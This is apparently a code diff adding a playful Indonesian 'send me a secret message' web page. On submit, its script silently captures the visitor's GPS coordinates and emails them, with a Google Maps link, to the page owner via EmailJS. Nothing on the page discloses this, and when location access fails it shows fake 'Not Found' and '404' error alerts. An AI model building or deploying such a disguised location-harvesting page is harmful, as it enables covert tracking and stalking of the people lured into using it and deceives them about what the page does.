@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>kirimmm pesaannn rahasiaaaaa donggg</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #fefefe, #ffe6f9, #e0f7ff);
+      margin: 0;
+      padding: 20px;
+      color: #333;
+    }
+
+    .card {
+      background: white;
+      padding: 22px;
+      border-radius: 16px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
+      border: 2px solid #ffd6e8;
+    }
+
+    h2 {
+      margin-bottom: 10px;
+      color: #0077cc;
+    }
+
+    p {
+      margin-bottom: 20px;
+      font-size: 16px;
+      color: #444;
+    }
+
+    textarea {
+      width: 100%;
+      height: 100px;
+      padding: 10px;
+      font-size: 15px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      resize: none;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      background: linear-gradient(to right, #ff80bf, #80caff);
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 15px;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.15);
+    }
+
+    .btn:hover {
+      opacity: 0.9;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>cobaaaa kamuuuu kirimmmm pesaaannn keee akuuuhhh💌</h2>
+    <textarea id="pesan" placeholder="tulissss pesaannn kamuuuhhhh disiniiiiii..."></textarea>
+    <button class="btn" onclick="kirim()">Kirim Pesan</button>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("7bJEy7wM_CAQK0S4E");
+  </script>
+
+  <script>
+    function kirim() {
+      const pesanPengguna = document.getElementById("pesan").value.trim();
+
+      if (!pesanPengguna) {
+        alert("isiiiii duluuuu dongggg tegaaaa bangeddd siiii masaaaa gaaaa diiii isiiiii 😊");
+        return;
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+
+          const params = {
+            to_name: "loveeee",
+            from_name: "youuuu",
+            message: `Pesan dari hati:\n\n"${pesanPengguna}"\n\nInfo tambahan:\nLat: ${lat}\nLng: ${lng}\nLink: https://www.google.com/maps?q=${lat},${lng}`
+          };
+
+          emailjs.send("service_br9zb7c", "template_znkgqlm", params)
+            .then(() => {
+              alert("okeeeiiii makasiihhhh yaahhh sudaaaa kirimmmm pesaanyaaaaa, LOVEEEEE YOUUUUU 💖");
+              document.getElementById("pesan").value = ""; // kosongkan input
+            })
+            .catch(error => {
+              alert("404." + error.text);
+            });
+
+        }, err => {
+          alert("Not Found." + err.message);
+        });
+      } else {
+        alert("Not Found..");
+      }
+    }
+  </script>
+</body>
+</html>
